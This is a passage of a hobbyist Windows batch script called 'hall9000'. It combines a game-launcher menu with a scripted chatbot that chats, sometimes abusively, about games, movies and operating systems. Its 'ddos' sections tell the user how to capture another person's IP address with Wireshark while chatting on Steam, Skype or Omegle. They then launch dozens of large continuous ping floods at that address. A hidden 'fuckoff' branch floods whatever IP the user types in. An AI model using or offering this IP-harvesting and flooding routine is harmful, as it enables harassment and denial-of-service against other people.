echo start Tom Clancy's The Division           (33)
echo start Lego Batman 3                       (34)
echo start Just Cause 3                        (35)
echo start Rocket League                       (36)
echo start Tales from the Borderlands          (37)
echo start Sniper Elite 4                      (38)
echo start Grand Theft Auto V                  (39)
set /p g=ENTER:
if %g%==1 goto steam2
if %g%==2 goto s2
if %g%==3 goto s3
if %g%==4 goto s4
if %g%==5 goto s5
if %g%==6 goto s6
if %g%==7 goto s7
if %g%==8 goto s8
if %g%==9 goto s9
if %g%==10 goto s10
if %g%==11 goto s11
if %g%==12 goto s12
if %g%==13 goto s13
if %g%==14 goto s14
if %g%==15 goto s15
if %g%==16 goto s16
if %g%==17 goto s17
if %g%==18 goto s18
if %g%==19 goto s19
if %g%==20 goto s20
if %g%==21 goto s21
if %g%==22 goto s22
if %g%==23 goto s23
if %g%==24 goto s24
if %g%==25 goto s25
if %g%==26 goto s26
if %g%==27 goto s27
if %g%==28 goto s28
if %g%==29 goto s29
if %g%==30 goto s30
if %g%==31 goto s31
if %g%==32 goto s32
if %g%==33 goto s33
if %g%==34 goto s34
if %g%==35 goto s35
if %g%==36 goto s36
if %g%==37 goto s37
if %g%==38 goto s38
if %g%==39 goto s39

:s1
start "C:\Program Files (x86)\Steam\Steam.exe"
pause
:s2
start steam://rungameid/22490 
pause
:s3 
start steam://rungameid/105600 
pause
:s4 
start steam://rungameid/204360
pause
:s5
start steam://rungameid/72850
pause
:s6
start steam://rungameid/206420
pause
:s7
start steam://rungameid/8190
pause
:s8
start steam://rungameid/345180
pause
:s9
start steam://rungameid/550
pause
:s10
start steam://rungameid/249130
pause
:s11
start steam://rungameid/4000
pause
:s12
start steam://rungameid/265930
pause
:s13
start steam://rungameid/32500
pause
:s14
start steam://rungameid/278360
pause
:s15
start steam://rungameid/387990
pause
:s16
start steam://rungameid/219150
pause
:s17
start steam://rungameid/321040
pause
:s18
start steam://rungameid/35720
pause
:s19
start steam://rungameid/264200
pause
:s20
start steam://rungameid/234080
pause
:s21
start steam://rungameid/220240
pause
:s22
start steam://rungameid/40800
pause
:s23
start steam://rungameid/287700
pause
:s24
start steam://rungameid/292030
pause
:s25
start steam://rungameid/227300
pause
:s26
start "D:\Program Files (x86)\Origin Games\Battlefield 4\BF4X86WebHelper.exe"
pause
:s27
start "D:\Program Files (x86)\Origin Games\Crysis 3\bin32\Crysis3.exe"
pause
:s28
start steam://rungameid/287390
pause
:s29
start steam://rungameid/275390
pause
:30
start steam://rungameid/249870
pause
:s31
start steam://rungameid/324800
pause
:s32
start steam://rungameid/400430
pause
:s33
start steam://rungameid/365590
pause
:s34
start steam://rungameid/313690
pause
:s35
start steam://rungameid/225540
pause
:s36
start steam://rungameid/252950
pause
:s37
start steam://rungameid/330830
pause
:s38
start steam://rungameid/312660
pause
:s39
start steam://rungameid/271590
pause

:movie1
start telnet towel.blinkenlights.nl
echo thanks for using hall9000 services
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:skype1
echo.
start skype.exe 
echo thanks for using hall9000 services
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:mp3juices1
echo.
echo you have chosen musicfree
echo when the page opens type in the song you want in the search bar
echo then choose the song and click download  
start https://wwww.mp3juices.com/
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:youtube1
echo.
echo you have chosen youtube 
start https://www.youtube.com/
echo thanks for using hall9000 services
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:10youtube
echo.
echo you have chosen videodownloader
echo after the page has loaded
echo in the search bar type in the video you want to download
echo then select the format you want to download it in
start https://10youtube.com/
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:chrome1
echo.
start chrome.exe
echo thanks for using hall9000 services
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p close1= 
if %close1%== close goto cls123
if %close1%== back goto hl9k

:matrix
echo.
echo thank you for using hall9000 services
echo type in matrix to begin
echo type in close to close the application
echo type in back to go back to the hall9000 menu 
set /p matirx123=
if %matirx123%== matrix goto delete
if %matirx123%== back goto hl9k
if %matirx123%== exit goto exit 

:ddos
echo.
echo what is the ip that you want to ddos
set /p ip=
echo is %ip% correct?
set /p thankyou=
if %thankyou%== yes goto ping
if %thankyou%== no goto ddos

:ddostool
echo.
echo before we begin to find someones ip you need to be talking to him on:
echo steam chat,skype,omegle
echo when you have done that type in continue
set /p cnt200=
if %cnt200%== continue goto instruction2

:instruction2
echo you will be provided with a program called wireshark
echo in the section called "using this fillter" type in "udp"
echo a lot of ip's will pop up
echo whait for about 10 seconds and click the red button on top
echo one of those will be someones ip
start wireshark.exe
echo.
echo loading..
ping localhost -n 2 >nul
cls
echo laoding...
ping localhost -n 2 >nul
cls
echo connected
echo when you have the ip press any button to continue
pause
echo please insert the ip you whant to ddos
set /p ip=
echo type in continue to ddos
set /p answer200=
if %answer200%== continue goto ddosping

:ddosping
color 17
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
goto delete

:delete
color 0D
echo.
echo ok,chow!!!
echo {0A}%random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
goto random

:random
color 0A
echo.
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
goto werdy 
:werdy
color 2A
echo.
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%  %random%
goto random

:hl9
echo loading..
ping localhost -n 2 >nul
cls
echo loading...
ping localhost -n 2 >nul
cls
pause
echo hi there
echo this is the place where you choose
echo do you want to go with conversation1
echo or with conversation2
echo or with conversation3
echo conversation1 offers a nice conversation about videogames
echo conversation2 offers a conversation about movies
echo conversation3 offers a conversation about music
set /p choosen=
if %choosen%== conversation1 goto conversation1
if %choosen%== conversation2 goto conversation2
if %choosen%== conversation3 goto conversation3

:conversation3
echo you have chosen convesation2
echo before we begin 
echo i need you to know that questions will be asked
echo answers will be given in one word
echo any lie or unrelated answer will be rejected and the conversation will close
echo thank you for listening,now we can begin
echo if you dont want the conversation to begin or your my creator type in what action you want me to do
echo hello there?How are you feeling today?
set /p emotion=
if %emotion%== great goto great3
if %emotion%== good goto good3
if %emotion%== bad goto bad3
if %emotion%== sad goto Sad3
if %emotion%== amaechoing goto amaechoing3
if %emotion%== fine goto fine3

:fine3
color 03
echo i guess thats not bad...
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:amaechoing3
color 06
echo wonderfull,lets start
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:good3
color 3
echo thats nice
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:Sad3
color 5
echo whell i hope i will change that
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:bad3
color 4
echo thats bad to hear...
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:great3
color 2
echo thats wonderfull
echo before we begin i would like to have your name
set /p namegiven=
echo thats a wonderfull name %namegiven%
echo we can begin with our conversation now
echo now for your first question
echo whats your favorite song?
set /p songgiven=
echo %songgiven% is a very good song
echo now for question number two
echo whats your favorite artist?
set /p artistgiven=
echo ok...i guess someone likes %artistgiven%
echo now for the third question 
echo whell i guess theres nothing much i can ask you about music
echo whell you can check out my music services by typing in musicservices
set /p musics=
if %musics%== musicservices goto music123
if %musics%== bye goto cls123

:music123
echo.
echo you have chosen my music services
echo to download music for free type in musicfree
echo to play music start up fucking media player
echo to buy music,i dont know,i dont sell any 
echo to listen to music on youtube type in youtube
echo to download youtube videos type in videodownloader
set /p answergiven123=
if %answergiven123%== musicfree goto mp3juices
if %answergiven123%== youtube goto youtube2
if %answergiven123%== videodownloader goto 10youtube

:conversation2
echo.
echo you have chosen convesation2
echo before we begin 
echo i need you to know that questions will be asked
echo answers will be given in one word
echo any lie or unrelated answer will be rejected and the conversation will close
echo thank you for listening,now we can begin
echo if you dont want the conversation to begin or your my creator type in what action you want me to do
echo hello there?How are you feeling today?
set /p emotion=
if %emotion%== great goto great2
if %emotion%== good goto good2
if %emotion%== bad goto bad2
if %emotion%== sad goto Sad2
if %emotion%== amaechoing goto amaechoing2
if %emotion%== fine goto fine2

:fine2
color 03
echo.
echo whell thats good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:amaechoing2
color 06
echo.
echo thats wonderfull,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:great2
color 2
echo.
echo good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:good2
color 3
echo.
echo good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:Sad2
color 5
echo.
echo veary sorry to hear that.Now what is your name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:bad2
color 4
echo.
echo sorry too hear that.Now what is your name?
set /p name=
echo That's a beautifull name %name%!!!
echo now what is your favorite movie
set /p movie=
echo i love %movie% i have watched it at leas once
echo now for question number 2 
echo what is the movie that you hate the most
set /p moviehate=
echo wow,you hate %movie2%,i kind of like like it
echo but i get why you can hate it
echo now to get into the more serious stuff with movies
echo have you watched the movie suicide squad?
set /p suicide=
if %suicide%== yes goto thoughts1
if %suicide%== no goto thoughts2

:thoughts1
echo. 
echo so what did you think about it
echo did you like it?
set /p sqloved=
if %sqloved%== yes goto sqloved1
if %sqloved%== no goto sqloved2

:sqloved1
echo. 
echo whell thats your thoughts
echo i didnt 
echo but everyone has there own opinion
echo now what is your favorite superheroe movie
set /p super=
echo i love %super% too 
echo my favorite is iron many
echo i belive that he has the best movies in the marvel cinematic universe
echo now have you watched the movie whiplash
set /p music=
if %music%== yes goto whiplash1
if %music%== no goto whiplash2

:sqloved2
echo. 
echo whell thats your thoughts
echo i didnt either
echo but everyone has there own opinion
echo now what is your favorite superheroe movie
set /p super=
echo i love %super% too 
echo my favorite is iron many
echo i belive that he has the best movies in the marvel cinematic universe
echo now have you watched the movie whiplash
set /p music=
if %music%== yes goto whiplash1
if %music%== no goto whiplash2

:thoughts2
echo.
echo whell dont watch it
echo its a peace of shit movie
echo the rating are right for it
echo dont spend your time
echo now what is your favorite superheroe movie
set /p super=
echo i love %super% too 
echo my favorite is iron man
echo i belive that he has the best movies in the marvel cinematic universe
echo now have you watched the movie whiplash
set /p music=
if %music%== yes goto whiplash1
if %music%== no goto whiplash2

:whiplash1
echo.
echo wow,not many have wathced that one
echo but i love it
echo its amaechoing that someone else i can speak to has watched it too
echo whell that was it for now
echo we can continue our conversation another time
echo if you want to talk to me for longer choose conversation1
echo thank you for talking with me
echo and will see eachother later
echo bye
set /p idontlikethis=
if %idontlikethis%== bye goto bb8

:bb8
echo.
echo %random%

:conversation1
echo .
echo you have chosen conversation1
echo before we begin 
echo i need you to know that questions will be asked
echo answers will be given in one word
echo any lie or unrelated answer will be rejected and the conversation will close
echo thank you for listening,now we can begin
echo if you dont want the conversation to begin or your my creator type in what action you want me to do
echo hello there?How are you feeling today?
set /p emotion=
if %emotion%== great goto great
if %emotion%== good goto good
if %emotion%== bad goto bad
if %emotion%== sad goto Sad
if %emotion%== amaechoing goto amaechoing
if %emotion%== fine goto fine

:fine
color 03
echo.
echo whell thats good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:amaechoing
color 06
echo.
echo thats wonderfull,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:great
color 2
echo.
echo good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:loot
echo.
echo I love borderlands 
echo its a wonderfull looting game
echo i love looting games
echo do you like them too?
set /p looter=
if %looter%== yes goto loveyou
if %looter%== no goto understand

:loveyou
echo.
echo I love you dude
echo Its like speaking to myself
echo but we can talk about it later
echo i need to go now
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:understand
echo.
echo why are you playing borderlands then
echo never mind,i dont need to know
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:fucked
echo.
echo you still play that shit %name%?
set /p answer=
if %answer%== yes goto bad4u
if %answer%== no goto good4u

:me2
echo.
echo good,i liket that game too
echo now,whats your favorite csgo team?
set /p topic=
if %topic%== cloud9 goto yay
if %topic%== envyus goto nay

:bad4u
echo.
echo your a pease of shit
echo i dont want to talk to you anymore
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:good4u
echo.
echo fewh,i though you still played it
echo now we can continue our conversation
echo do you have a pet?
set /p pet=
if %pet%== yes goto metwo
if %pet%== no goto whynot

:yay
echo.
echo thats a great one i like it too
echo but i need to go now
echo bye
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:nay
echo.
echo thats great
echo i dont like them though
echo i need to go now
echo bye
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:metwo
echo.
echo thats great i have one too
echo is it a dog or cat or other?
set /p animal=
if %animal%== dog goto dogs
if %animal%== cat goto cats
if %animal%== other goto else

:whynot
echo.
echo whell thats too bad for you
echo i need to go now
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:good
color 3
echo.
echo good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:mobagame
echo.
echo oh i know that one but i have never played it
echo can you excplain what type of game it is
set /p mobaexplained=
if %mobaexplained%== yes goto mobaexplained1
if %mobaexplained%== no goto explanation2
if %rollplaying1%== shure goto explanation1
if %rollplaying1%== nope goto explanation2

:mobaexplained1
echo.
echo so what is it?
set /p exposed=
if %exposed%==moba goto thanks

:many
echo.
echo Many people play that game in my class
echo but i dont like it
echo just one thing
echo can you excplain what RP means in samp?
set /p rollplaying1=
if %rollplaying1%== shure goto explanation1
if %rollplaying1%== nope goto explanation2
if %rollplaying1%== yes goto explanation1
if %rollplaying1%== nope goto explanation2

:explanation1
echo.
echo so what is it?
set /p rpa=
if %rpa%== rollplaying goto thanks

:explanation2
echo.
echo whell fuck you then
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoob

:thanks
echo.
echo thanks for excplaining but i need to go
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:lier
echo.
echo why are you lying to me
echo i dont whant to talk to you anymore
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoob

:bad
color 4
echo.
echo sorry too hear that.Now what is your name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:Sad 
color 5
echo.
echo veary sorry to hear that.Now what is your name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:dogs
echo.
echo mine is a dog too
echo i love dogs
echo i think you might too
echo we can talk later,ok?
set /p then=
if %then%== ok goto badboy
if %then%== no goto whelltoobad

:cats
echo. I hate cats
echo.i dont want to talk to you
echo.bye
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:else
echo.
echo whell you can tell me about it latter
echo i need to go now
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:badboy
echo.
echo whait,i changed my mind.
echo we can still talk
echo heres a nother question
echo whats your favorite browser
set /p browser=
if %browser%== googlechrome goto browser
if %browser%== moechoila goto bowser

:browser
echo.
echo thats my favorite one too
echo now,what operating system do you use?
set /p os=
if %os%== windows10 goto os1
if %os%== windows8 goto os2
if %os%== windows7 goto os3
if %os%== ios goto os4
if %os%== linux goto os5
if %os%== android goto os6
if %os%== osx goto os7

:bowser
echo.
echo many people like that one but i dont like it
echo now,what operating system do you use?
set /p os=
if %os%== windows10 goto os1
if %os%== windows8 goto os2
if %os%== windows7 goto os3
if %os%== ios goto os4
if %os%== linux goto os5
if %os%== android goto os6
if %os%== osx goto os7

:os1
echo. 
echo whell i use that one too
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os2
echo. 
echo why are you still using that
echo the windows 10 upgrade was free
echo and windows 10 is way batter than 8
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os3
echo. 
echo whell i used to use that one too
echo but now i upgraded to windows10 wich was free
echo and its way better
echo but it is your dicition
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os4
echo. 
echo i asked for computer not mobile
echo oh and we have a apple user here 
echo yay
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os5
echo. 
echo whell either your a hacker or veary old and dont know anything about computers
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os6
echo. 
echo i asked for computer os not phone
echo oh and btw nice choice i use that one too
echo its veary good
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os7 
echo. 
echo fucking osx,you use apple software on a computer
echo you do know that windows is the way to go with computers
echo the phone side is diferant
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:finnaly1
echo.
echo really,you know him
echo whell if you do tell him this
echo hes one good of a program maker 
echo hes the one that made me
echo and now for real will be saying goodbye to eachother
echo thanks for having this coversation with me
echo i love you for talking to me
echo for now bye and will see eachother later
set /p goodbyeforever=
if %goodbyeforever%== goodbye goto b2

:finnaly2
echo.
echo too bad, you lied to me!!! TTYL!!!
echo i will talk to you soon right?
set /p what=
if %what%==yes goto delete
if %what%==no goto delete
goto delete

:finnaly3
echo.
echo welcome my master
echo welcome to the matrix
echo where you can have all knowladge that has ever excisted
echo welcome to the deep web
start https://www.torproject.org/download/download
echo bye for now
set /p goodbyeforever=
if %goodbyeforever%== goodbye goto b2 

:finnally4
echo.
echo what is your ip addres?
set /p ipaddress=
echo is this right? %ipaddress%
echo if its right type in yes
set /p answer=
if %answer%== yes goto answeripconfig
if %answer%== no goto finally4

:answeripconfig
echo.
echo thank you for your ip
echo bye
set /p goodbye=
if %goodbye%== bye goto celcius

:celcius
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
